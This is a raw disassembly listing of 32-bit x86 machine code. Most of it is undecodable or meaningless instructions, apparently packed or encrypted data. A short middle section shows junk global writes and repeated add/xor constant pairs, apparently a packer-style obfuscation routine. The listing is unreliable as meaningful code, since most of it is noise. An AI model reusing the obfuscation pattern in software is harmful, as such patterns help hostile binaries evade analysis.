  40837c:	test   BYTE PTR [esi],0xca
  40837f:	out    0xe4,eax
  408381:	fimul  DWORD PTR [eax]
  408383:	in     al,dx
  408384:	rcr    edi,cl
  408386:	(bad)  
  408388:	rcl    ch,cl
  40838a:	mov    al,0xf2
  40838c:	mov    dh,0xd3
  40838e:	clc    
  40838f:	(bad)  
  408391:	repnz loop 0x408360
  408394:	mov    ebp,0xd1dfd9ed
  408399:	(bad)  
  40839b:	icebp  
  40839c:	loopne 0x4083a2
  40839e:	loope  0x408365
  4083a0:	iret   
  4083a1:	aam    0xde
  4083a3:	add    al,0xc2
  4083a5:	(bad)  
  4083a6:	not    ebp
  4083a8:	aad    0xca
  4083aa:	mov    dh,0xf4
  4083ac:	mov    bh,0xe9
  4083ae:	fldln2 
  4083b0:	mov    ah,0xfe
  4083b2:	mov    edi,0xfa02daef
  4083b7:	mov    ah,0xd2
  4083b9:	add    esp,ebx
  4083bb:	or     esp,edi
  4083bd:	clc    
  4083be:	cmc    
  4083bf:	stc    
  4083c0:	(bad)  
  4083c1:	clc    
  4083c2:	std    
  4083c3:	iret   
  4083c4:	(bad)  
  4083c5:	iret   
  4083c6:	iret   
  4083c7:	jmp    0xd1c0:0xc0c9c6e2
  4083ce:	out    dx,al
  4083cf:	into   
  4083d0:	sti    
  4083d1:	xlat   BYTE PTR ds:[ebx]
  4083d2:	rcl    ch,1
  4083d4:	add    ebx,ecx
  4083d6:	(bad)  
  4083d7:	cli    
  4083d8:	clc    
  4083d9:	add    ah,dh
  4083db:	or     al,bh
  4083dd:	(bad)  
  4083de:	not    ebp
  4083e0:	call   0xe50d8db2
  4083e5:	out    0xd2,al
  4083e7:	rcl    esi,0xc8
  4083ea:	shl    DWORD PTR [ebx-0x40002738],0xb6
  4083f1:	xlat   BYTE PTR ds:[ebx]
  4083f2:	cld    
  4083f3:	hlt    
  4083f4:	add    eax,DWORD PTR [edi]
  4083f6:	out    0x0,al
  4083f8:	loope  0x4083cb
  4083fa:	mul    cl
  4083fc:	fdivp  st(5),st
  4083fe:	(bad)
  408401:	(bad)  
  408403:	fcmovu st,st(6)
  408405:	scas   eax,DWORD PTR es:[edi]
  408406:	retf   
  408407:	test   al,0xaf
  408409:	loop   0x4083e0
  40840b:	in     al,dx
  40840c:	loopne 0x4083c8
  40840e:	in     al,0xd5
  408410:	retf   
  408411:	aad    0xba
  408413:	fucomp st(6)
  408415:	cli    
  408416:	add    esi,edx
  408418:	cli    
  408419:	loope  0x4083fc
  40841b:	rol    ch,0x0
  40841e:	hlt    
  40841f:	out    dx,eax
  408420:	leave  
  408421:	sti    
  408422:	or     al,0xe9
  408424:	iret   
  408425:	lock out 0xf3,al
  408428:	jmp    0x4083dd
  40842a:	test   esi,0xefdfd5b9
  408430:	in     al,0xbd
  408432:	mov    ebp,0xdbe8d1bb
  408437:	repnz ffreep st(3)
  40843a:	loopne 0x408445
  40843c:	sti    
  40843d:	jmp    0xd308:0xfef8fce9
  408444:	in     al,dx
  408445:	fucom  st(1)
  408447:	repnz mov ch,0xaa
  40844a:	jmp    0xf2276b06
  40844f:	repz in al,0xf5
  408452:	iret   
  408453:	ffreep st(3)
  408455:	cmc    
  408456:	shl    ah,cl
  408458:	add    ah,cl
  40845a:	add    edi,DWORD PTR [eax-0x3009fa20]
  408460:	leave  
  408461:	loopne 0x408441
  408463:	loopne 0x408427
  408465:	test   al,0xed
  408467:	shr    dl,1
  408469:	call   0xbc1b3b2f
  40846e:	mov    bh,0xe6
  408470:	mov    ebx,0xb7e2e8d5
  408475:	aad    0x6
  408477:	add    eax,0x203ebd7
  40847c:	fimul  WORD PTR [edi]
  40847e:	or     ah,ah
  408480:	faddp  st(2),st
  408482:	(bad)  
  408483:	leave  
  408484:	in     eax,dx
  408485:	shr    BYTE PTR [esi-0x3a2d1740],cl
  40848b:	mov    ah,0xc6
  40848d:	icebp  
  40848e:	call   0xf23f3e80
  408493:	out    dx,al
  408494:	add    BYTE PTR [esi-0x14323e0b],bh
  40849a:	rol    esp,1
  40849c:	clc    
  40849d:	inc    ecx
  40849f:	test   BYTE PTR [edx],0xd9
  4084a2:	loop   0x4084b3
  4084a4:	ftst   
  4084a6:	jmp    0xf8145769
  4084ab:	xlat   BYTE PTR ds:[ebx]
  4084ac:	clc    
  4084ad:	(bad)  
  4084ae:	sar    DWORD PTR [edx-0x70e092e],1
  4084b4:	ret    0xeeda
  4084b7:	rcr    dl,1
  4084b9:	add    bl,bh
  4084bb:	std    
  4084bc:	jmp    0xe003:0xd8f6dee5
  4084c3:	inc    ah
  4084c5:	xlat   BYTE PTR ds:[ebx]
  4084c6:	int3   
  4084c7:	(bad)
  4084ca:	call   0xe6f253ba
  4084cf:	(bad)  
  4084d0:	clc    
  4084d1:	rcr    dl,cl
  4084d3:	iret   
  4084d4:	add    esi,DWORD PTR [esi-0x21d1ffe]
  4084da:	cld    
  4084db:	lock aad 0xc1
  4084de:	loop   0x4084de
  4084e0:	enter  0xc8fe,0xf
  4084e4:	fdivrp st(0),st
  4084e6:	ret    0xddcb
  4084e9:	imul   eax
  4084eb:	mov    bl,0xee
  4084ed:	(bad)  
  4084ef:	icebp  
  4084f0:	aam    0xf8
  4084f2:	out    dx,al
  4084f3:	inc    ebx
  4084f5:	cli    
  4084f6:	mov    edi,0xd00bcdf5
  4084fb:	add    al,0xc2
  4084fd:	enter  0xc50b,0xc9
  408501:	iret   
  408502:	add    edi,esp
  408504:	ror    ah,0xd1
  408507:	lock shr bh,1
  40850a:	ret    0xb4ca
  40850d:	mov    edx,0xf6eac4b1
  408512:	fcmovbe st,st(1)
  408514:	mov    esi,0xd1e501dc
  408519:	fcomp  st(6)
  40851b:	icebp  
  40851c:	fsub   st(1),st
  40851e:	hlt    
  40851f:	out    0xea,eax
  408521:	clc    
  408522:	fsubrp st(2),st
  408524:	jecxz  0x4084d0
  408526:	jmp    0x4084d0
  408528:	mov    dl,0xfb
  40852a:	lods   eax,DWORD PTR ds:[esi]
  40852b:	loop   0x4084fd
  40852d:	fsubr  st,st(2)
  40852f:	call   0xc4115808
  408534:	icebp  
  408535:	fnstsw WORD PTR [eax+0x7dd04f1]
  40853b:	cld    
  40853c:	add    al,0x5
  40853e:	or     BYTE PTR ds:0xce2ea02,al
  408544:	shr    ecx,1
  408546:	scas   al,BYTE PTR es:[edi]
  408547:	rcl    esi,0xb1
  40854a:	mov    ah,0xf1
  40854c:	in     eax,0xc4
  40854e:	mov    cl,0xbf
  408550:	out    dx,eax
  408551:	fdivr  st,st(2)
  408553:	mov    esi,0xd8dfbce1
  408558:	(bad)  
  408559:	push   es
  40855a:	sar    esi,0x9
  40855d:	cmc    
  40855e:	fmul   st,st(0)
  408560:	loope  0x408563
  408562:	int    0x8
  408564:	mov    ebp,0xc8f0caa8
  408569:	into   
  40856a:	out    0xb6,al
  40856c:	int3   
  40856d:	div    DWORD PTR [edi-0xe32331a]
  408573:	into   
  408574:	(bad)  
  408576:	aam    0xff
  408578:	sti    
  408579:	loopne 0x408572
  40857b:	mov    eax,0xc406e7c9
  408580:	call   0xc0136f8c
  408585:	test   edi,0xcef5cce3
  40858b:	stc    
  40858c:	cli    
  40858d:	cmc    
  40858e:	jmp    0x40858e
  408590:	into   
  408591:	add    ebp,ecx
  408593:	mov    ebx,0xbdfae8c1
  408598:	add    al,0xda
  40859a:	lock mov eax,0xeadfc8c7
  4085a0:	add    al,0xda
  4085a2:	bswap  edi
  4085a4:	jecxz  0x40856b
  4085a6:	test   eax,0xe1caeda8
  4085ab:	into   
  4085ac:	loopne 0x4085a3
  4085ae:	cmc    
  4085af:	mov    dh,0xb6
  4085b1:	aad    0xbe
  4085b3:	mov    eax,0x6e100bc
  4085b8:	push   es
  4085b9:	(bad)  
  4085bb:	inc    BYTE PTR [edi]
  4085bd:	add    ch,bl
  4085bf:	or     eax,0xf8c1fc00
  4085c4:	stos   DWORD PTR es:[edi],eax
  4085c5:	repnz lods eax,DWORD PTR ds:[esi]
  4085c7:	leave  
  4085c8:	loopne 0x40858b
  4085ca:	leave  
  4085cb:	stc    
  4085cc:	(bad)
  4085cf:	hlt    
  4085d0:	int    0xfd
  4085d2:	out    dx,al
  4085d3:	sar    BYTE PTR [ebx-0x1b0b2623],1
  4085d9:	sar    esi,1
  4085db:	retf   
  4085dc:	fcmovu st,st(2)
  4085de:	paddb  mm2,mm4
  4085e1:	jmp    0xebfd71ae
  4085e6:	test   al,0xc3
  4085e8:	(bad)  
  4085e9:	lock (bad) 
  4085eb:	lods   al,BYTE PTR ds:[esi]
  4085ec:	retf   
  4085ed:	rcr    edi,1
  4085ef:	xlat   BYTE PTR ds:[ebx]
  4085f0:	in     eax,0xb2
  4085f2:	(bad)  
  4085f4:	clc    
  4085f5:	fsin   
  4085f7:	push   es
  4085f8:	rcl    ecx,cl
  4085fa:	mov    ebp,0xee6dcf8
  4085ff:	into   
  408600:	int    0xf8
  408602:	in     al,dx
  408603:	push   es
  408604:	test   al,0xa8
  408606:	call   0xc61262d6
  40860b:	shl    ebx,0xc5
  40860e:	stc    
  40860f:	(bad)  
  408610:	stc    
  408611:	rcr    esi,1
  408613:	cld    
  408614:	out    dx,eax
  408615:	mov    esp,0xccede0b8
  40861a:	fcmovnbe st,st(0)
  40861c:	fucomi st,st(3)
  40861e:	clc    
  40861f:	(bad)  
  408621:	loope  0x408630
  408623:	adc    ecx,edi
  408625:	repnz leave 
  408627:	iret   
  408628:	lock out dx,al
  40862a:	repz in eax,dx
  40862c:	(bad)  
  40862d:	mov    dl,0xb1
  40862f:	in     eax,dx
  408630:	mov    esi,0xe3eeccce
  408635:	(bad)  
  408636:	(bad)  
  408637:	ret    0xcce4
  40863a:	jmp    0xe3e9:0xf9ddf403
  408641:	add    ecx,ebp
  408643:	loopne 0x408616
  408645:	shr    DWORD PTR [ebp-0x4f093c50],cl
  40864b:	test   al,0xe6
  40864d:	mov    ah,0xe5
  40864f:	(bad)  
  408650:	mov    bh,0xeb
  408652:	fxch   st(2)
  408654:	cmc    
  408655:	(bad)  
  408656:	mov    esp,0x3e301de
  40865b:	fcomp  st(5)
  40865d:	enter  0xbe0,0xe7
  408661:	(bad)  
  408662:	std    
  408663:	add    DWORD PTR [ecx-0x303a201d],edi
  408669:	in     eax,dx
  40866a:	in     eax,dx
  40866b:	lods   al,BYTE PTR ds:[esi]
  40866c:	(bad)  
  40866d:	int3   
  40866e:	call   0xb930503e
  408673:	jmp    0xc0fc:0xc2b9e7ed
  40867a:	cli    
  40867b:	xlat   BYTE PTR ds:[ebx]
  40867c:	add    eax,0xcfe7f5
  408681:	or     DWORD PTR [ebx],edx
  408683:	push   cs
  408684:	in     al,dx
  408685:	int    0xb0
  408687:	lods   eax,DWORD PTR ds:[esi]
  408688:	call   0xd5156d68
  40868d:	shr    bh,cl
  40868f:	cli    
  408690:	(bad)
  408693:	(bad)  
  408694:	add    ebx,edx
  408696:	fnstsw WORD PTR [esi-0x1519fc24]
  40869c:	or     bh,bh
  40869e:	aad    0xed
  4086a0:	(bad)  
  4086a3:	jmp    0xb7cb:0xf2bcbdf3
  4086aa:	mov    ah,0xe1
  4086ac:	jmp    0x408688
  4086ae:	rcr    eax,1
  4086b0:	hlt    
  4086b1:	mov    edi,0xfcecc8cc
  4086b6:	sar    esi,0xf1
  4086b9:	rol    cl,0xf5
  4086bc:	leave  
  4086bd:	out    dx,eax
  4086be:	fcmovb st,st(5)
  4086c0:	or     ecx,eax
  4086c2:	loope  0x4086b2
  4086c4:	out    0xdd,al
  4086c6:	out    dx,eax
  4086c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086c8:	aam    0xc6
  4086ca:	not    eax
  4086cc:	ror    esp,cl
  4086ce:	jmp    0xd0d8:0x3caf3ca
  4086d5:	out    dx,eax
  4086d6:	into   
  4086d7:	fcmovnb st,st(3)
  4086d9:	add    al,dl
  4086db:	in     al,0xdd
  4086dd:	enter  0xdbc0,0xdd
  4086e1:	add    esp,edx
  4086e3:	fsub   st(2),st
  4086e5:	mov    esp,0xd0cfcee8
  4086ea:	shl    ch,0xf7
  4086ed:	mov    eax,0xf7d5e4b8
  4086f2:	mov    ah,0xc9
  4086f4:	fxch   st(5)
  4086f6:	in     al,dx
  4086f7:	out    0xfd,al
  4086f9:	loope  0x408705
  4086fb:	cmc    
  4086fc:	in     eax,0xc7
  4086fe:	cmc    
  4086ff:	or     al,cl
  408701:	sti    
  408702:	or     al,0x7
  408704:	mov    esi,0xf2cfe1c2
  408709:	ret    0xb4d0
  40870c:	retf   
  40870d:	(bad)  
  40870e:	rcr    al,cl
  408710:	fnsave [edx-0xf104646]
  408716:	shl    edi,0xc7
  408719:	fstp   TBYTE PTR [ecx+0x9d8eb06]
  40871f:	fdivp  st(3),st
  408721:	cli    
  408722:	fisttp WORD PTR [esi+edi*4]
  408725:	loopne 0x408716
  408727:	mov    al,0xe3
  408729:	loop   0x408715
  40872b:	xlat   BYTE PTR ds:[ebx]
  40872c:	retf   0xd2f7
  40872f:	icebp  
  408730:	iret   
  408731:	inc    ebx
  408733:	ret    0xb8d0
  408736:	fidiv  WORD PTR [edi+eax*8-0x3c291b2c]
  40873d:	shl    ah,0xdd
  408740:	retf   0xebdd
  408743:	or     eax,0xd7cec5ad
  408748:	mov    bl,0xc8
  40874a:	aad    0xd3
  40874c:	in     eax,dx
  40874d:	out    0xe6,eax
  40874f:	icebp  
  408750:	fbstp  TBYTE PTR [edx-0x3c23312e]
  408756:	add    dh,ah
  408758:	(bad)  
  408759:	(bad)  
  40875b:	cmc    
  40875c:	(bad)  
  40875e:	rol    DWORD PTR [ebx],0xf
  408761:	out    0xc8,al
  408763:	add    bh,BYTE PTR [ecx+edx*8-0x23495021]
  40876a:	loopne 0x40875b
  40876c:	jmp    0xcd2d4c3c
  408771:	clc    
  408772:	(bad)  
  408773:	fcomp  st(6)
  408775:	hlt    
  408776:	fcomip st,st(7)
  408778:	sar    esp,0xf5
  40877b:	mov    BYTE PTR [ebx],0x5
  40877e:	or     cl,bl
  408780:	into   
  408781:	jmp    0xc7259651
  408786:	mov    edi,0xbbb1c7f3
  40878b:	shr    edx,0xeb
  40878e:	fdivr  st,st(6)
  408790:	cli    
  408791:	mov    ebx,0xc1f3bbd6
  408796:	in     al,dx
  408797:	add    ecx,ebp
  408799:	fisttp DWORD PTR [edx]
  40879b:	or     edi,esi
  40879d:	(bad)  
  40879f:	test   cl,0x3
  4087a2:	bswap  edi
  4087a4:	scas   eax,DWORD PTR es:[edi]
  4087a5:	lods   eax,DWORD PTR ds:[esi]
  4087a6:	repnz shr al,0xcd
  4087aa:	mov    dl,0xc8
  4087ac:	neg    bl
  4087ae:	(bad)  
  4087af:	out    dx,eax
  4087b0:	fcmove st,st(1)
  4087b2:	cli    
  4087b3:	jecxz  0x408784
  4087b5:	mov    dh,0xdc
  4087b7:	fsubr  st(7),st
  4087b9:	add    cl,bl
  4087bb:	bnd ret 
  4087bd:	test   DWORD PTR [eax],0xda04fa06
  4087c3:	in     eax,0xf3
  4087c5:	scas   al,BYTE PTR es:[edi]
  4087c6:	(bad)  
  4087c8:	rol    al,1
  4087ca:	loop   0x4087c1
  4087cc:	in     al,dx
  4087cd:	mov    dh,0xd4
  4087cf:	cmc    
  4087d0:	(bad)  
  4087d2:	cld    
  4087d3:	mul    dl
  4087d5:	sar    edi,0xff
  4087d8:	in     eax,dx
  4087d9:	(bad)  
  4087db:	lock leave 
  4087dd:	(bad)
  4087e0:	retf   0xe3c9
  4087e3:	cld    
  4087e4:	ret    0xbca9
  4087e7:	lods   eax,DWORD PTR ds:[esi]
  4087e8:	scas   eax,DWORD PTR es:[edi]
  4087e9:	mov    al,0xe5
  4087eb:	aam    0xda
  4087ed:	iret   
  4087ee:	in     al,dx
  4087ef:	lock xlat BYTE PTR ds:[ebx]
  4087f1:	icebp  
  4087f2:	fsincos 
  4087f4:	mov    esi,0xdd03f5f0
  4087f9:	xlat   BYTE PTR ds:[ebx]
  4087fa:	or     dl,al
  4087fc:	or     esi,esp
  4087fe:	dec    DWORD PTR [eax]
  408800:	ret    
  408801:	or     eax,0xdecc11ed
  408806:	shl    DWORD PTR [edx+ecx*8-0xf3a0a2a],cl
  40880d:	aam    0xd8
  40880f:	std    
  408810:	call   eax
  408812:	shl    BYTE PTR [eax-0x7c47080e],cl
  408818:	fld    DWORD PTR [eax]
  40881a:	or     DWORD PTR ds:0x437773,0x43776f
  408824:	xor    eax,0x8a29a14b
  408829:	xor    ecx,0x0
  40882c:	adc    DWORD PTR ds:0x43770f,0x45ac
  408836:	xor    eax,0x8a29a14b
  40883b:	or     DWORD PTR ds:0x437743,0x680c
  408845:	xor    ecx,0x0
  408848:	adc    DWORD PTR ds:0x437737,0x53d4
  408852:	add    eax,0x5424137
  408857:	adc    ecx,0x0
  40885a:	sbb    ecx,DWORD PTR ds:0x437723
  408860:	mov    ecx,DWORD PTR [ebp-0x4]
  408863:	and    DWORD PTR ds:0x4377b3,0x437713
  40886d:	mov    ecx,DWORD PTR [ecx]
  40886f:	sub    DWORD PTR ds:0x43777b,0x4c6e
  408879:	xor    ecx,eax
  40887b:	mov    eax,DWORD PTR [ebp-0x4]
  40887e:	mov    DWORD PTR [eax],ecx
  408880:	and    DWORD PTR ds:0x43776f,0x0
  40888a:	mov    ecx,DWORD PTR ds:0x43776f
  408890:	inc    ecx
  408891:	mov    DWORD PTR ds:0x43776f,ecx
  408897:	cmp    DWORD PTR ds:0x43776f,0x21
  40889e:	jge    0x4088c4
  4088a4:	jmp    0x4088b7
  4088a9:	push   0x43777f
  4088ae:	push   DWORD PTR [ebp-0xc]
  4088b1:	call   DWORD PTR ds:0x43c990
  4088b7:	cmp    DWORD PTR ds:0x43776f,0x1e
  4088be:	jb     0x40888a
  4088c4:	mov    eax,DWORD PTR [ebp+0x14]
  4088c7:	mov    eax,DWORD PTR [eax]
  4088c9:	sbb    ecx,DWORD PTR ds:0x4377b7
  4088cf:	mov    DWORD PTR [ebp-0x24],eax
  4088d2:	mov    DWORD PTR ds:0x43777f,0x1e
  4088dc:	cmp    DWORD PTR ds:0x43777f,0x0
  4088e3:	je     0x408942
  4088e9:	cmp    DWORD PTR ds:0x43777f,0xf
  4088f0:	jbe    0x408942
  4088f6:	jmp    0x408916
  4088fb:	push   DWORD PTR [ebp-0x20]
  4088fe:	push   0x79ea
  408903:	push   0x437038
  408908:	push   0x43707c
  40890d:	push   DWORD PTR [ebp-0x24]
  408910:	call   DWORD PTR ds:0x43c994
  408916:	cmp    DWORD PTR ds:0x43777f,0x10
  40891d:	jne    0x408930
  408923:	mov    ecx,DWORD PTR ds:0x43777f
  408929:	dec    ecx
  40892a:	mov    DWORD PTR ds:0x43777f,ecx
  408930:	mov    ecx,DWORD PTR ds:0x43777f
  408936:	dec    ecx
  408937:	mov    DWORD PTR ds:0x43777f,ecx
  40893d:	jmp    0x4088dc
  408942:	mov    eax,DWORD PTR [ebp-0x24]
  408945:	mov    eax,DWORD PTR [eax]
  408947:	sbb    DWORD PTR ds:0x437717,ebx
  40894d:	mov    ecx,DWORD PTR [ebp-0x4]
  408950:	mov    ecx,DWORD PTR [ecx]
  408952:	or     DWORD PTR ds:0x437733,0x5314
  40895c:	xor    edx,edx
  40895e:	sub    ecx,0x5424137
  408964:	mov    DWORD PTR ds:0x43778b,0x2c2f
  40896e:	sbb    edx,0x0
  408971:	xor    ecx,0x8a29a14b
  408977:	xor    DWORD PTR ds:0x4377b3,0x4c4d
  408981:	xor    edx,0x0
  408984:	add    DWORD PTR ds:0x437787,0x4377b3
  40898e:	xor    ecx,0x8a29a14b
  408994:	and    DWORD PTR ds:0x437717,0x380f
  40899e:	xor    edx,0x0
  4089a1:	add    ecx,0x5424137
  4089a7:	mov    DWORD PTR ds:0x437713,0x5282
  4089b1:	adc    edx,0x0
  4089b4:	mov    eax,DWORD PTR [eax]
  4089b6:	add    DWORD PTR ds:0x43775f,0x43771b
  4089c0:	xor    esi,esi
  4089c2:	sbb    DWORD PTR ds:0x437783,0x7cb2
  4089cc:	add    eax,ecx
  4089ce:	adc    esi,edx
  4089d0:	mov    DWORD PTR ds:0x43773f,edi
  4089d6:	mov    ecx,DWORD PTR [ebp-0x24]
  4089d9:	mov    ecx,DWORD PTR [ecx]
  4089db:	mov    DWORD PTR ds:0x43775b,0x153c
  4089e5:	mov    DWORD PTR [ecx],eax
  4089e7:	mov    eax,DWORD PTR [ebp-0xc]
  4089ea:	mov    DWORD PTR [eax],0x70941f81
  4089f0:	mov    DWORD PTR [eax+0x4],0xffffffff
  4089f7:	jmp    0x40d295
  4089fc:	mov    eax,ds:0x43775b
  408a01:	xor    eax,DWORD PTR ds:0x4377a3
  408a07:	mov    ds:0x43775b,eax
  408a0c:	jmp    0x40ad5a
  408a11:	jl     0x4089e1
  408a13:	push   0x542468a2
  408a18:	hlt    
  408a19:	pop    ds
  408a1a:	nop
  408a1b:	leave  
  408a1c:	mov    dl,al
  408a1e:	call   0x7b7b:0xe208e97d
  408a25:	stos   BYTE PTR es:[edi],al
  408a26:	cwde   
  408a27:	jnp    0x408aa4
  408a29:	shl    eax,1
  408a2b:	add    eax,ebp
  408a2d:	inc    BYTE PTR [edi]
  408a2f:	aad    0xfc
  408a31:	in     eax,dx
  408a32:	push   es
  408a33:	fcmovnu st,st(1)
  408a35:	iret   
  408a36:	fmulp  st(2),st
  408a38:	lods   al,BYTE PTR ds:[esi]
  408a39:	mov    cl,0xc9
  408a3b:	mov    esp,0xeee4e0b1
  408a40:	fcomi  st,st(3)
  408a42:	cmc    
  408a43:	hlt    
  408a44:	jmp    0x408a1d
  408a46:	in     al,dx
  408a47:	shr    edi,1
  408a49:	fadd   QWORD PTR [edi*4-0x3ef716fd]
  408a50:	or     ecx,ecx
  408a52:	loope  0x408a5a
  408a54:	adc    ecx,edi
  408a56:	enter  0xc1e8,0xe2
  408a5a:	mov    al,0xc8
  408a5c:	(bad)  
  408a5d:	mov    al,0xcd
  408a5f:	in     al,0xe4
  408a61:	(bad)
  408a64:	add    dh,dh
  408a66:	fdivr  DWORD PTR [edi-0xf3c2634]
  408a6c:	vpmaddwd ymm3,ymm5,ymm0
  408a70:	leave  
  408a71:	loope  0x408a76
  408a73:	fcomp  st(3)
  408a75:	int    0xb9
  408a77:	fidiv  WORD PTR [edx-0x91c1242]
  408a7d:	rcl    al,0xf1
  408a80:	mov    ebx,0xead0dff3
  408a85:	fneni(8087 only) 
  408a87:	rol    edi,cl
  408a89:	sar    ah,1
  408a8b:	mov    esp,0xe7e604db
  408a90:	out    dx,eax
  408a91:	add    esp,esp
  408a93:	out    0x8,eax
  408a95:	adc    DWORD PTR [ebp-0x37312e39],ebp
  408a9b:	mov    esp,0xe8f8f1cd
  408aa0:	(bad)
  408aa3:	aam    0xfe
  408aa5:	leave  
  408aa6:	rol    eax,cl
  408aa8:	cmc    
  408aa9:	lock in al,0x6
  408aac:	std    
  408aad:	cld    
  408aae:	ret    0xefe3
  408ab1:	add    eax,0xcdcfe1ea
  408ab6:	int3   
  408ab7:	in     eax,dx
  408ab8:	call   0xc7f4378b
  408abd:	aam    0xca
  408abf:	icebp  
  408ac0:	in     eax,dx
  408ac1:	out    dx,eax
  408ac2:	div    eax
  408ac4:	cli    
  408ac5:	fdivp  st(5),st
  408ac7:	mov    edi,0xe2f8ecbe
  408acc:	(bad)  
  408acd:	or     ecx,ecx
  408acf:	inc    eax
  408ad1:	loope  0x408ad6
  408ad3:	loope  0x408aa1
  408ad5:	stc    
  408ad6:	(bad)  
  408ad8:	ror    al,1
  408ada:	int3   
  408adb:	(bad)
  408ade:	(bad)  
  408ae0:	aad    0xec
  408ae2:	into   
  408ae3:	jecxz  0x408ac7
  408ae5:	jmp    0xe0bd:0x2d6dff8
  408aec:	jmp    0x408ad8
  408aee:	hlt    
  408aef:	fcmovu st,st(6)
  408af1:	cli    
  408af2:	loop   0x408adb
  408af4:	sti    
  408af5:	out    0xca,eax
  408af7:	(bad)  
  408af9:	mov    al,0xc9
  408afb:	lods   eax,DWORD PTR ds:[esi]
  408afc:	mov    ebx,0xd8f0d9b2
  408b01:	mov    ebx,0xfbf6d9fc
  408b06:	ret    
  408b07:	mov    esp,0xebd8dde2
  408b0c:	ret    
  408b0d:	test   BYTE PTR [eax],0xf6
  408b10:	sti    
  408b11:	retf   0x8fb
  408b14:	stc    
  408b15:	repz mov bl,0xb1
  408b18:	enter  0xb6f3,0xd6
  408b1c:	ret    
  408b1d:	mov    al,0xf4
  408b1f:	fdivr  st,st(7)
  408b21:	int    0xd0
  408b23:	in     al,0xc3
  408b25:	add    DWORD PTR [ebx-0x2600fdff],edi
  408b2b:	lds    edi,FWORD PTR [ebp-0x23f4193c]
  408b31:	or     bh,cl
  408b33:	in     eax,dx
  408b34:	or     al,0xde
  408b36:	sar    BYTE PTR [ebp-0x282f0a57],cl
  408b3c:	loop   0x408b20
  408b3e:	(bad)  
  408b3f:	dec    edi
  408b41:	hlt    
  408b42:	div    bl
  408b44:	hlt    
  408b45:	test   bh,0x7
  408b48:	hlt    
  408b49:	fdivp  st(1),st
  408b4b:	icebp  
  408b4c:	fsubr  st(5),st
  408b4e:	fdivr  QWORD PTR [esi-0x3638fa1d]
  408b54:	cld    
  408b55:	int    0xb9
  408b57:	int    0xb3
  408b59:	ret    
  408b5a:	aam    0xc9
  408b5c:	loope  0x408b39
  408b5e:	shr    ebx,1
  408b60:	rcr    ch,cl
  408b62:	in     eax,0xd3
  408b64:	out    dx,eax
  408b65:	repz add bh,BYTE PTR [eax-0x2c39331d]
  408b6c:	fcomp  st(7)
  408b6e:	loopne 0x408b53
  408b70:	rcl    ah,0xe7
  408b73:	retf   0xdfcc
  408b76:	stos   BYTE PTR es:[edi],al
  408b77:	ret    
  408b78:	shr    edx,0xac
  408b7b:	(bad)  
  408b7c:	div    dl
  408b7e:	cli    
  408b7f:	int    0xee
  408b81:	mov    al,0xd8
  408b83:	retf   0x3f7
  408b86:	fcomi  st,st(0)
  408b88:	ret    
  408b89:	idiv   dh
  408b8b:	(bad)  
  408b8d:	in     eax,0xf8
  408b8f:	aam    0xe0
  408b91:	call   0xe82b6780
  408b96:	(bad)  
  408b97:	iret   
  408b98:	out    0xc5,al
  408b9a:	ror    ecx,0xe8
  408b9d:	(bad)
  408ba0:	(bad)  
  408ba1:	mov    bh,0xdc
  408ba3:	aam    0xf2
  408ba5:	loop   0x408b73
  408ba7:	loopne 0x408b97
  408ba9:	(bad)  
  408bab:	aam    0xd3
  408bad:	ror    ecx,1
  408baf:	fiadd  WORD PTR [esi]
  408bb1:	jecxz  0x408bac
  408bb3:	enter  0xe6f9,0xbe
  408bb7:	scas   eax,DWORD PTR es:[edi]
  408bb8:	frstor [edi+eiz*8-0x1e353b1d]
  408bbf:	(bad)  
  408bc0:	out    0xd8,al
  408bc2:	mov    bl,0xfd
  408bc4:	add    esi,ebp
  408bc6:	rol    BYTE PTR [ecx],cl
  408bc8:	icebp  
  408bc9:	fnstsw WORD PTR [ebp-0x9091d22]
  408bcf:	(bad)  
  408bd0:	aad    0x0
  408bd2:	(bad)  
  408bd3:	fsubrp st(4),st
  408bd5:	fdiv   DWORD PTR [ecx-0x151f141f]
  408bdb:	int3   
  408bdc:	aad    0xd5
  408bde:	sti    
  408bdf:	in     eax,dx
  408be0:	mov    bh,0xff
  408be2:	neg    edx
  408be4:	xlat   BYTE PTR ds:[ebx]
  408be5:	add    bl,ch
  408be7:	shl    dh,1
  408be9:	loope  0x408bdf
  408beb:	lds    eax,FWORD PTR ds:0xf80a06e5
  408bf1:	add    esp,ebp
  408bf3:	jmp    0xbcbd:0xe9c9d303
  408bfa:	test   cl,0xd1
  408bfd:	(bad)  
  408bff:	(bad)  
  408c01:	rcl    eax,cl
  408c03:	call   0x43740e0
  408c08:	icebp  
  408c09:	jecxz  0x408bf8
  408c0b:	inc    DWORD PTR [eax]
  408c0d:	repnz std 
  408c0f:	psraw  mm6,mm6
  408c12:	dec    ecx
  408c14:	enter  0xecfe,0xd1
  408c18:	jmp    0xf2ba:0xcbf3c7af
  408c1f:	fmul   st,st(7)
  408c21:	lods   al,BYTE PTR ds:[esi]
  408c22:	stc    
  408c23:	cli    
  408c24:	fnclex 
  408c26:	sti    
  408c27:	sti    
  408c28:	mov    edi,0xc4c7bcbc
  408c2d:	fcmovnb st,st(3)
  408c2f:	fmul   QWORD PTR [edx]
  408c31:	in     al,0xef
  408c33:	into   
  408c34:	sar    ebp,cl
  408c36:	retf   
  408c37:	loopne 0x408c18
  408c39:	mov    dl,0xc4
  408c3b:	call   0xcd164433
  408c40:	in     al,0xfe
  408c42:	sar    esi,cl
  408c44:	mov    ecx,0xd2ced8c8
  408c49:	shl    cl,cl
  408c4b:	add    eax,esi
  408c4d:	(bad)  
  408c4e:	fcmovnbe st,st(0)
  408c50:	or     ah,bl
  408c52:	jmp    0xca256a25
  408c57:	in     al,dx
  408c58:	rcl    edx,cl
  408c5a:	mov    dl,0xe0
  408c5c:	lods   eax,DWORD PTR ds:[esi]
  408c5d:	fldlg2 
  408c5f:	(bad)  
  408c60:	mov    ah,0xf5
  408c62:	shl    edx,1
  408c64:	retf   
  408c65:	ffree  st(3)
  408c67:	add    ebp,ebp
  408c69:	fcomi  st,st(3)
  408c6b:	fsubp  st(3),st
  408c6d:	lock sar ebp,1
  408c70:	(bad)  
  408c71:	out    dx,eax
  408c72:	(bad)  
  408c74:	jmp    0xcef0:0xd7e9e2df
  408c7b:	hlt    
  408c7c:	mov    cl,0xba
  408c7e:	mov    al,0xdf
  408c80:	(bad)  
  408c81:	cmc    
  408c82:	mov    dh,0xb9
  408c84:	repz (bad) 
  408c86:	sti    
  408c87:	add    al,bh
  408c89:	mov    eax,0xe2f4f201
